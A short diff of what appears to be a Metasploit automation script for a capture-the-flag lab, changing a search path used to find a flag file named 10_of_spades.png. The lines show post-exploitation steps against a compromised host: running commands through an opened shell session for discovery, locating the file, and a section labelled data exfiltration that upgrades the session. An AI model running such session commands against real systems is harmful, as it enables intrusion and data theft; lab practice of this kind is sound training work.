@@ -34,7 +34,7 @@ exploit -j
 #*"Command Shell session X opened ..."
 ##-m DISCOVERY
 sessions -i X -c 'whoami'
-sessions -i X -c 'find . -name 10_of_spades.png'
+sessions -i X -c 'find /opt/readme_app -name 10_of_spades.png'
 #*location of 10_of_spades.png
 ##-m DATA EXFIL
 sessions -u X
